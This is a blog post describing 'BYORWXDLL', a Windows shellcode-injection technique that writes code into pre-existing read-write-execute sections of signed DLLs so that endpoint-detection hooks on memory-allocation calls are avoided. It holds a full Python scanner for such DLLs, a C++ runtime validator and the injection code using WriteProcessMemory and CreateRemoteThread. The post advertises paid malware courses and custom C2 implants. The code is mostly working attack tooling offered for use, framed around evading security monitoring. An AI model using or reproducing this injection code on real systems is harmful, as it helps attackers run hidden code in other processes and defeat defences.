# https://medium.com/@s12deff/bring-your-own-rwx-region-dll-byorwxdll-0283951d34e9

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fbring-your-own-rwx-region-dll-byorwxdll-0283951d34e9&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fbring-your-own-rwx-region-dll-byorwxdll-0283951d34e9&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Bring Your Own RWX Region DLL ( **BYORWXDLL**)

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:32:32/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---byline--0283951d34e9---------------------------------------)

[S12 - 0x12Dark Development](https://medium.com/@s12deff?source=post_page---byline--0283951d34e9---------------------------------------)

Follow

8 min read

·

Jun 2, 2026

4

1

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D0283951d34e9&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Fbring-your-own-rwx-region-dll-byorwxdll-0283951d34e9&source=---header_actions--0283951d34e9---------------------post_audio_button------------------)

Share

Welcome to this new Medium post, today we are exploring a technique I call **Bring Your Own RWX Region DLL (BYORWXDLL)**, inspired by the well-known BYOVD (Bring Your Own Vulnerable Driver) concept. Instead of loading a vulnerable driver to gain kernel read/write primitives, this technique abuses legitimate, signed DLLs that already contain pre-defined RWX (Read+Write+Execute) memory regions when loaded into a process.

## Get S12 - 0x12Dark Development’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

The core idea is simple: if a target process already has one of these DLLs loaded, or if we can force it to load one, we get a writable and executable memory region without calling `VirtualAllocEx` or `VirtualProtectEx`, two of the most monitored API calls in modern EDR detection pipelines. This reduces the syscall noise of a classic shellcode injection

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*TJSZpvzME9_vm4Uj2osB6g.png)

**Courses:** Learn how offensive development works on Windows OS from beginner to advanced taking our courses, all explained in C++.

[**All Courses** \\
\\
**Learn how real Windows offensive development works**\\
\\
0x12darkdev.net](https://0x12darkdev.net/courses/?origin=medium&source=post_page-----0283951d34e9---------------------------------------)

**Technique Database:** Access 70+ real offensive techniques with weekly updates, complete with code, PoCs, and AV scan results:

[**Malware Techniques Database** \\
\\
**Explore an ever-growing collection of techniques**\\
\\
0x12darkdev.net](https://0x12darkdev.net/techniques/?source=post_page-----0283951d34e9---------------------------------------)

**Modules**: Dive deep into essential offensive topics with our modular **text-training** program! Get a new module every 14 days. Start at just **$1.99 per module**, or unlock **lifetime access to all modules for $100**.

[**0x12 Dark Development** \\
\\
**Learn the best offensive techniques for Windows OS, with content ranging from beginner to advanced levels. All…**\\
\\
0x12darkdev.net](https://0x12darkdev.net/modules?source=post_page-----0283951d34e9---------------------------------------)

## Methodology

To achieve shellcode execution inside a remote process without calling suspicious APIs, we need to follow these logical steps:

1. **Discovery (Static):** First, we scan DLL files on disk looking for PE sections that have the `READ + WRITE + EXECUTE` flags set in their `Characteristics` field. A section with these three flags means that when Windows maps it into memory, those pages will be writable and executable at the same time. We use `pefile` in Python to parse the section table of every `.dll` found on the system
2. **Validation (Dynamic):** Once we have a candidate DLL, we load it into a test process with `LoadLibrary` and walk its memory regions using `VirtualQuery`. This confirms that the RWX region actually exists at runtime, because the OS may split or adjust page protections during mapping. We look for `PAGE_EXECUTE_READWRITE` and `PAGE_EXECUTE_WRITECOPY`
3. **Targeting:** With the RWX region confirmed, we identify processes that already have this DLL loaded. Those processes have a writable and executable memory region we can use directly, no allocation, no permission change needed.
4. **Injection:** Finally, we open a handle to the target process, write our shellcode into the known RWX region address using `WriteProcessMemory`, and trigger execution with `CreateRemoteThread` pointing to that address.

If there is no process with this DLL, you can always inject this DLL into one running process and perform there the injection, more noise, but the injection still happening inside a legit module memory space

```
[Disk] rwx_dll_scanner.py
         |
         v
[Candidate DLL with RWX section]
         |
         v
[Runtime] dll_loader_rwx.exe --> VirtualQuery --> RWX region confirmed
         |
         v
[Target process has DLL loaded?] --> WriteProcessMemory --> CreateRemoteThread
```

## Implementation

Now, let’s look at how to translate that logic into C++ code. I have broken down the most important parts.

### **Static Discovery + Finding RWX Sections on Disk (Python)**

We parse each DLL with `pefile` and check if any section has all three flags set simultaneously. The key mask is `READ | WRITE | EXECUTE = 0xE0000000`

```
IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ    = 0x40000000
IMAGE_SCN_MEM_WRITE   = 0x80000000
RWX_MASK              = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE

def is_rwx(characteristics: int) -> bool:
    return (characteristics & RWX_MASK) == RWX_MASK
```

We use `fast_load=True` to only parse the PE header and section table, we do not need to load the full binary into memory, which makes the scan much faster across thousands of DLLs

### **Dynamic Validation + Confirming RWX at Runtime**

After `LoadLibrary`, we read the PE header of the loaded module to get its image boundaries, then walk every committed memory region inside that range with `VirtualQuery`:

```
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
PIMAGE_NT_HEADERS  nt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);

scanStart = (ULONG_PTR)hModule;
scanEnd   = scanStart + nt->OptionalHeader.SizeOfImage;
```

We check for two protection values, `PAGE_EXECUTE_READWRITE` is fully RWX, and `PAGE_EXECUTE_WRITECOPY` is the copy-on-write variant that Windows uses for pages that have not been modified yet but are part of a **writable + executable** section:

```
BOOL isRWX  = (mbi.Protect == PAGE_EXECUTE_READWRITE);
BOOL isRWXC = (mbi.Protect == PAGE_EXECUTE_WRITECOPY);
```

Both are valid targets for shellcode placement.

### Injection: WriteProcessMemory + CreateRemoteThread

Now that we know the RWX region address, we open a handle to the target process and write our shellcode directly into it, no `VirtualAllocEx`, no `VirtualProtectEx`:

```
// Open handle to target process
HANDLE hProcess = OpenProcess(
    PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
    FALSE,
    targetPid
);

// Write shellcode into the known RWX region
SIZE_T written = 0;
WriteProcessMemory(
    hProcess,
    (LPVOID)rwxRegionBase,   // address found by our scanner
    shellcode,
    shellcodeSize,
    &written
);

// Trigger execution
HANDLE hThread = CreateRemoteThread(
    hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)rwxRegionBase,
    NULL,
    0,
    NULL
);

WaitForSingleObject(hThread, INFINITE);
CloseHandle(hThread);
CloseHandle(hProcess);
```

The key difference from a classic injection is what we are **not** calling. A standard shellcode injection does:

```
VirtualAllocEx      <-- allocate RW memory
WriteProcessMemory  <-- write shellcode
VirtualProtectEx    <-- change to RX
CreateRemoteThread  <-- execute
```

BYORWXDLL does:

```
WriteProcessMemory  <-- write directly into pre-existing RWX region
CreateRemoteThread  <-- execute
```

Two fewer syscalls. No memory allocation event. No permission change event. Both `VirtualAllocEx` and `VirtualProtectEx` are heavily monitored by EDRs via userland hooks on `ntdll.dll`, skipping them reduces the detection surface significantly

## Code

**scanner.py**

```
#!/usr/bin/env python3
"""
rwx_dll_scanner.py
==================
0x12 Dark Development — https://0x12darkdev.net

Scans all DLLs in specified Windows directories for PE sections
with pre-defined RWX (Read+Write+Execute) flags.

Usage:
    python rwx_dll_scanner.py
    python rwx_dll_scanner.py --paths "C:\\Windows\\System32" "C:\\MyApp"
    python rwx_dll_scanner.py --output results.json
    python rwx_dll_scanner.py --paths "C:\\Windows\\System32" --output results.json --verbose

Requirements:
    pip install pefile
"""

import os
import sys
import json
import argparse
import time
import traceback
from datetime import datetime, timezone

try:
    import pefile
except ImportError:
    print("[ERROR] pefile not installed. Run: pip install pefile")
    sys.exit(1)

# PE section characteristic flags
IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ    = 0x40000000
IMAGE_SCN_MEM_WRITE   = 0x80000000
RWX_MASK              = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE

# Default scan directories
DEFAULT_PATHS = [\
    r"C:\Windows\System32",\
    r"C:\Windows\SysWOW64",\
    r"C:\Windows\SystemApps",\
    r"C:\Program Files",\
    r"C:\Program Files (x86)",\
]

def is_rwx(characteristics: int) -> bool:
    """Returns True if section flags contain READ + WRITE + EXECUTE."""
    return (characteristics & RWX_MASK) == RWX_MASK

def section_name(raw: bytes) -> str:
    """Decode section name, stripping null bytes."""
    return raw.rstrip(b"\x00").decode("utf-8", errors="replace")

def scan_dll(filepath: str) -> dict | None:
    """
    Parse a DLL and return info about RWX sections.
    Returns None if the file is not a valid PE or has no RWX sections.
    """
    try:
        pe = pefile.PE(filepath, fast_load=True)
    except pefile.PEFormatError:
        return None
    except Exception:
        return None

    rwx_sections = []
    for section in pe.sections:
        chars = section.Characteristics
        if is_rwx(chars):
            rwx_sections.append({
                "name":             section_name(section.Name),
                "characteristics":  hex(chars),
                "virtual_address":  hex(section.VirtualAddress),
                "virtual_size":     hex(section.Misc_VirtualSize),
                "raw_size":         hex(section.SizeOfRawData),
            })

    pe.close()

    if not rwx_sections:
        return None

    return {
        "path":         filepath,
        "filename":     os.path.basename(filepath),
        "rwx_sections": rwx_sections,
        "section_count": len(rwx_sections),
    }

def scan_directory(base_path: str, verbose: bool = False) -> list[dict]:
    """Walk a directory recursively and scan every .dll found."""
    results = []

    if not os.path.isdir(base_path):
        print(f"  [SKIP] Path not found: {base_path}")
        return results

    for root, _, files in os.walk(base_path):
        for filename in files:
            if not filename.lower().endswith(".dll"):
                continue

            filepath = os.path.join(root, filename)

            try:
                result = scan_dll(filepath)
                if result:
                    results.append(result)
                    if verbose:
                        print(f"  [RWX] {filepath} — {result['section_count']} section(s)")
            except PermissionError:
                if verbose:
                    print(f"  [DENY] {filepath}")
            except Exception as e:
                if verbose:
                    print(f"  [ERR]  {filepath} — {e}")

    return results

def build_report(findings: list[dict], scan_paths: list[str], elapsed: float) -> dict:
    """Build the final JSON report structure."""
    return {
        "meta": {
            "tool":        "rwx_dll_scanner",
            "author":      "0x12 Dark Development",
            "website":     "https://0x12darkdev.net",
            "timestamp":   datetime.now(timezone.utc).isoformat(),
            "scan_paths":  scan_paths,
            "elapsed_sec": round(elapsed, 2),
        },
        "summary": {
            "total_dlls_with_rwx": len(findings),
            "total_rwx_sections":  sum(f["section_count"] for f in findings),
        },
        "findings": findings,
    }

def main():
    parser = argparse.ArgumentParser(
        description="Scan Windows DLLs for pre-defined RWX PE sections."
    )
    parser.add_argument(
        "--paths",
        nargs="+",
        default=DEFAULT_PATHS,
        metavar="DIR",
        help="Directories to scan (default: System32, SysWOW64, Program Files)"
    )
    parser.add_argument(
        "--output",
        default="rwx_scan_results.json",
        metavar="FILE",
        help="Output JSON file (default: rwx_scan_results.json)"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Print each hit and error in real time"
    )
    args = parser.parse_args()

    print("=" * 60)
    print("  RWX DLL Scanner — 0x12 Dark Development")
    print("=" * 60)
    print(f"  Scan paths : {', '.join(args.paths)}")
    print(f"  Output     : {args.output}")
    print(f"  Verbose    : {args.verbose}")
    print("=" * 60)

    all_findings = []
    start = time.time()

    for path in args.paths:
        print(f"\n[*] Scanning: {path}")
        results = scan_directory(path, verbose=args.verbose)
        all_findings.extend(results)
        print(f"    -> {len(results)} DLL(s) with RWX sections found")

    elapsed = time.time() - start

    report = build_report(all_findings, args.paths, elapsed)

    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print("\n" + "=" * 60)
    print(f"  DONE in {elapsed:.2f}s")
    print(f"  DLLs with RWX  : {report['summary']['total_dlls_with_rwx']}")
    print(f"  Total sections : {report['summary']['total_rwx_sections']}")
    print(f"  Report saved   : {args.output}")
    print("=" * 60)

if __name__ == "__main__":
    main()
```

**main.cpp**

```
#include <Windows.h>
#include <stdio.h>

static void ScanRWX(HMODULE hModule){
    // Determine the address range to scan
    ULONG_PTR scanStart = 0;
    ULONG_PTR scanEnd = (ULONG_PTR)-1;

    if (hModule)
    {
        // Get the image size from the PE header to bound the scan
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS  nt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);

        scanStart = (ULONG_PTR)hModule;
        scanEnd = scanStart + nt->OptionalHeader.SizeOfImage;
    }

    printf("\n[*] Scanning RWX regions");
    if (hModule)
        printf(" in module range [0x%p - 0x%p]", (void*)scanStart, (void*)scanEnd);
    else
        printf(" in full process address space");
    printf("\n\n");

    ULONG_PTR    addr = scanStart;
    DWORD        count = 0;
    MEMORY_BASIC_INFORMATION mbi = {};

    while (addr < scanEnd &&
        VirtualQuery((LPCVOID)addr, &mbi, sizeof(mbi)) == sizeof(mbi))
    {
        BOOL isCommitted = (mbi.State == MEM_COMMIT);
        BOOL isRWX = (mbi.Protect == PAGE_EXECUTE_READWRITE);
        // Also catch EXECUTE_WRITECOPY which is effectively RWX
        BOOL isRWXC = (mbi.Protect == PAGE_EXECUTE_WRITECOPY);

        if (isCommitted && (isRWX || isRWXC))
        {
            const char* protStr = isRWX ? "PAGE_EXECUTE_READWRITE" : "PAGE_EXECUTE_WRITECOPY";

            printf("  [RWX] Base: 0x%p | Size: 0x%08zX | Protect: %s\n",
                mbi.BaseAddress,
                mbi.RegionSize,
                protStr);

            // Try to identify what mapped this region
            char modName[MAX_PATH] = "<unknown>";
            // GetMappedFileName requires psapi; use a simple heuristic instead:
            // check if the region falls inside our loaded module range
            ULONG_PTR regionBase = (ULONG_PTR)mbi.BaseAddress;
            if (hModule &&
                regionBase >= scanStart &&
                regionBase < scanEnd)
            {
                printf("         Module: loaded DLL (0x%p)\n", (void*)hModule);
            }
            else
            {
                printf("         Module: outside loaded DLL range\n");
            }

            count++;
        }

        // Gguard against infinite loop on zero-size regions
        ULONG_PTR next = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
        if (next <= addr) break;
        addr = next;
    }

    if (count == 0)
        printf("  [OK] No RWX regions found.\n");
    else
        printf("\n  Total RWX regions: %lu\n", count);
}

int main(int argc, char* argv[])
{
    if (argc < 2)
    {
        printf("Usage: %s <dll_path> [--full-scan]\n", argv[0]);
        printf("  --full-scan  Scan entire process space instead of module range only\n");
        return 1;
    }

    const char* dllPath = argv[1];
    BOOL        fullScan = (argc >= 3 && strcmp(argv[2], "--full-scan") == 0);

    printf("  DLL Loader + RWX Scanner\n");

    printf("[*] Loading : %s\n", dllPath);

    HMODULE hModule = LoadLibraryA(dllPath);
    if (!hModule)
    {
        printf("[!] LoadLibrary failed: error %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Base    : 0x%p\n", (void*)hModule);
    printf("[+] PID     : %lu\n\n", GetCurrentProcessId());

    ScanRWX(fullScan ? NULL : hModule);

    printf("\n[>] Press ENTER to unload and exit...\n");
    getchar();

    FreeLibrary(hModule);
    printf("[*] DLL unloaded.\n");

    return 0;
}
```

And then just the classic process injection:

[**Understanding Malware Process Injection in Windows: A Guide for Beginners and Experts** \\
\\
**Understanding Malware Process Injection in Windows: A Guide for Beginners and Experts Process injection is a technique…**\\
\\
frankkyazze.medium.com](https://frankkyazze.medium.com/understanding-malware-process-injection-in-windows-a-guide-for-beginners-and-experts-f6fd531cc3c6?source=post_page-----0283951d34e9---------------------------------------)

## Proof of Concept

**Windows 11:**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*TJSZpvzME9_vm4Uj2osB6g.png)

We build custom C2 agents and implants for red teams, giving full control and stealthy operation in real-world tests.

[**Custom Agents — 0x12 Dark Development** \\
\\
**Custom C2 Agents Built for the Real World. Command & Control agents compatible with Mythic, Havoc and leading…**\\
\\
0x12darkdev.net](https://0x12darkdev.net/custom-agents/?source=post_page-----0283951d34e9---------------------------------------)

## Conclusions

BYORWXDLL is a simple but effective concept, instead of creating noise with `VirtualAllocEx` and `VirtualProtectEx`, we reuse memory that the OS already marked as executable and writable through a legitimate, signed DLL. The technique requires a discovery phase (static scan + runtime validation) to find viable candidates on the target system, but once a candidate is identified, the injection itself is cleaner and quieter than the classic approach

**📌 Follow me:** [YouTube](https://www.youtube.com/@0x12darkdev) \| 🐦 [X](https://x.com/Salsa12__) \| 💬 [Discord Server](https://discord.gg/K2HqYuj5Tv) \| 📸 [Instagram](https://www.instagram.com/malwaredevs12) \| [Newsletter](https://0x12darkdevelopmentnewsletter.eo.page/q41nr)

**S12.**

[Malware](https://medium.com/tag/malware?source=post_page-----0283951d34e9---------------------------------------)

[Infosec](https://medium.com/tag/infosec?source=post_page-----0283951d34e9---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----0283951d34e9---------------------------------------)

[Pentesting](https://medium.com/tag/pentesting?source=post_page-----0283951d34e9---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----0283951d34e9---------------------------------------)

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:48:48/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--0283951d34e9---------------------------------------)

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:64:64/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--0283951d34e9---------------------------------------)

Follow

[**Written by S12 - 0x12Dark Development**](https://medium.com/@s12deff?source=post_page---post_author_info--0283951d34e9---------------------------------------)

[4.2K followers](https://medium.com/@s12deff/followers?source=post_page---post_author_info--0283951d34e9---------------------------------------)

· [51 following](https://medium.com/@s12deff/following?source=post_page---post_author_info--0283951d34e9---------------------------------------)

Red Team Enthusiast [https://0x12darkdev.net/](https://0x12darkdev.net/)

Follow

[Help](https://help.medium.com/hc/en-us?source=post_page-----0283951d34e9---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----0283951d34e9---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----0283951d34e9---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----0283951d34e9---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----0283951d34e9---------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----0283951d34e9---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----0283951d34e9---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----0283951d34e9---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----0283951d34e9---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**